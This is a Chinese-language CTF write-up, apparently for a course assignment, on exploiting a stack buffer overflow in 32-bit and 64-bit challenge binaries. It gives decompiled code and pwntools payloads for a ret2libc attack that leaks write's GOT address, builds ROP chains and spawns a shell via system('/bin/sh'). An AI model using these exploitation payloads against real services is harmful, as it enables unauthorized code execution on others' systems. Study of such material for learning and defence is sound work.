## 1.作业要求：
分析附件中的2个有漏洞的程序（同一个代码编译的32位版本、64位版本），获取部署了该漏洞程序的目标服务器中的flag（一个文件的内容，格式大概为：flag{...}），即为攻击成功。
附件中包含2个程序的可执行文件，以及可能需要的libc库。编写你的exploit，完成本地测试之后，去目标服务器验证。

## 2.反汇编代码
vuln32：
```
nt __cdecl main(int argc, const char **argv, const char **envp)
{
  setbuf(stdin, 0);
  setbuf(stdout, 0);
  setbuf(stderr, 0);
  write(1, wel, 0x1Eu);
  dovuln();
  return 0;
}

int dovuln()
{
  int v0; // eax
  char buf; // [esp+4h] [ebp-44h]
  char v3[51]; // [esp+5h] [ebp-43h]
  int v4; // [esp+38h] [ebp-10h]
  unsigned int v5; // [esp+3Ch] [ebp-Ch]

  v5 = __readgsdword(0x14u);
  memset(v3, 0, 0x30u);
  v4 = 0;
  while ( 1 )
  {
    if ( read(0, &buf, 1u) != 1 )
      exit(0);
    if ( buf == 10 )
      break;
    v0 = v4++;
    v3[v0] = buf;
  }
  return puts(v3);
}
```
## 3.思路：
漏洞点：char v3[51]数据读取无验证越界，导致栈溢出。
防护：  
![](https://raw.githubusercontent.com/ReAbout/ctf-writeup/master/pwn000/images/pwn3.png)<br>
奇怪的是开启canary，但是无法修改无法触发。主要就是考虑过NX。
本题提供了libc，就是使用write函数将got表中write（read）地址作为参数，调用plt表中的write函数，得到基地址后加上libc中的system函数在程序中的偏移，就得到了system函数的实际地址，进行调用即可。
### 1 [32bit]
####(1)发送payload溢出覆盖return，返回到glt表write函数，输出got表中write的地址，并返回到main函数。
也就是先调用write(1,write函数地址,4)，第一个参数文件描述符等于1表示输出，4代表输出的长度，中间的就是输出的内容，调用完成后返回主函数，得到基地址后为泄露system函数的地址做准备。
Payload:
```
num = 51 
payload = num * 'a'+'\x47'
payload += p32(elf.symbols['write'])
#payload += p32(0x80486b2)
payload += p32(elf.symbols['main'])
payload += p32(1)
payload += p32(elf.got['write'])
payload += p32(4)
```
#### (2)计算出libc中system（）和bin/sh中的地址
write_addr - system_addr == write_addr_libc - system_addr_libc
```
wirte_offset = libc.symbols['write']
system_offset = libc.symbols['system']
bin_sh_offset = next(libc.search('/bin/sh'))
libc_base = write_addr -wirte_offset
system_addr = libc_base + system_offset
bin_sh_addr = libc_base + bin_sh_offset
```
#### (3)再次发送payload溢出覆盖return，返回到system（）利用参数bin/sh，执行命令。
```
payload2 = 'a'*num + '\x47'
payload2 += p32(system_addr)
payload2 += p32(1)
payload2 += p32(bin_sh_addr)
```
__get flag__: flag{Ok_yOu_get@#$_it!}   
![](https://raw.githubusercontent.com/ReAbout/ctf-writeup/master/pwn000/images/pwn1.PNG)<br>
### [64bit]
x64思路相同，区别在于参数传递需要通过寄存器入栈。
>在x64下通常参数从左到右依次放在rdi, rsi, rdx, rcx, r8, r9，多出来的参数才会入栈.

索要就要找到通过32bit我们知道write，需要三个参数，即用到rdi、rsi、rdx三个寄存器。
利用工具[ROPgadget](https://github.com/JonathanSalwan/ROPgadget)  --binary 指定二进制文件，使用grep在输出的所有gadgets中寻找需要的片段。
![](https://raw.githubusercontent.com/ReAbout/ctf-writeup/master/pwn000/images/pwn4.png)<br>
可以看到前面两个都可以找到合适的gadget，但是 pop rdx 的却找不到，也就是write函数的第三个参数是我们不能控制的，但是在动态调试时候，在read函数处下断点可以看到，此时的rdx是为 0x200，也就是说 write 函数的标准输出的长度为0x200字节，这里只要大于8个字节（地址长度），我们都可以得到read函数的真实地址（got表中的地址）
payload：
```
pop_rdi_addr = 0x0000000000400933 #pop rdi ; ret
pop_rsi_addr = 0x0000000000400931 # pop rsi ; pop r15 ; ret
payload = num * 'a'+'\x47'
payload += p64(pop_rdi_addr)
payload += p64(1)

payload += p64(pop_rsi_addr)        
payload += p64(elf.got['write'])  #rsi      
payload += p64(0)   #r15

payload += p64(elf.plt['write'])
payload += p64(elf.symbols['main'])   
```
payload2:
```
payload2 += p64(pop_rdi_addr)
payload2 += p64(bin_sh_addr)
payload2 += p64(system_addr)
```
__get flag__: flag{__you_are_so_Cu7e_!!}   
![](https://raw.githubusercontent.com/ReAbout/ctf-writeup/master/pwn000/images/pwn2.png)<br>
# EXP
[32bit Exploit](https://github.com/ReAbout/ctf-writeup/blob/master/pwn000/files/exp.py)
[64bit Exploit](https://github.com/ReAbout/ctf-writeup/blob/master/pwn000/files/exp64.py)

